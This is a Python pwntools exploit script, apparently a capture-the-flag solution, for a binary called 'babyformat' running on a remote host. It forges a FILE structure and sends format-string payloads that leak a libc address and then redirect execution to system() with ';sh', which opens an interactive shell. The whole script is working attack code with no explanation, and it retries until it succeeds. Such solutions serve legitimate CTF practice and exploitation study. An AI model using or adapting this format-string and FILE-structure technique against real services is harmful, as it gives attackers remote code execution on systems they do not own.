from pwn import *

context.arch = 'amd64'
e = ELF('./babyformat')
libc = ELF('./libc-2.23.so')

fs = FileStructure()
fs.flags = 0xfbad2c80
fs._IO_read_ptr = 0x602480
fs._IO_read_base = 0x602480
fs._IO_read_end = 0x602480
fs._IO_write_base = 0x602480
fs._IO_write_ptr = 0x6024c0
fs._IO_write_end = 0x6024d0
fs._IO_buf_base = 0x602480
fs._IO_buf_end = 0x6024d0
fs._old_offset = 0
fs.fileno = 0x3
fs._lock = 0x602380
fs._wide_data = 0x602390
fs.vtable = 0x602140

def exp():
    p = remote('192.46.228.70', 31337)
    p.recvuntil(': ')
    p.sendline('%40c%11$hhn%9$p'.ljust(0x10, '\x00') + str(fs)[0x10:] + ('A'*0x10 + p64(0x4009cb)).ljust(136, 'A') + p64(0x400740))
    p.recvuntil('0x')
    libc.address = int(p.recvuntil('Dat', drop=True), 16)-0x6d3ff
    log.success('Libc leak: '+hex(libc.address))
    p.recvuntil(': ')
    p.sendline('%40c%11$hhn;sh'.ljust(0x10, '\x00') + str(fs)[0x10:] + ('A'*0x10 + p64(0x4006ee)).ljust(136, 'A') + p64(libc.symbols['system']))
    p.interactive()

run = True
while run:
    try:
        exp()
        run = False
    except:
        continue
